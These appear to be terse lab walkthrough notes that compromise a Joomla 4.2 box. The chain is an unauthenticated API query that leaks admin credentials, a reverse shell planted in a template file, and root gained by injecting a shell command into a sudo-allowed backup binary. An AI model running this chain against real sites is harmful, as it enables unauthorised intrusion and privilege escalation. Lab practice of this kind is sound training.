```zsh
#autorecon shows README.txt
#version joomala 4.2
searchsploit joomla 4.2
#unauthenticated information disclosure

curl --path-as-is http://10.1.161.65/api/index.php/v1/users?public=true
#user -> Miyamoto
curl --path-as-is http://10.1.161.65/api/index.php/v1/config/application?public=true > config.json
#password Pa847word987@Joomla456
#Use Miyamoto : Pa847word987@Joomla456 to login to admin
#Go to server -> templates -> error.php -> rev shell and visit the said link at http://10.1.161.65/templates/cassiopeia/error.php

sudo -l 
#(root) NOPASSWD: /opt/backup/DbMaria
#send it to kali, strings
#we see it uses mariadb-dump
mariadb-dump --socket=/run/mysqld/mysqld.sock -u root %s > /tmp/backup.sql
#strings also showed reference to system() call. This strongly suggests that the binary builds a system command using user-controlled input and then executes it using `system()`.
sudo /opt/backup/DbMaria 'gg; /bin/bash -p #'
#and root!
```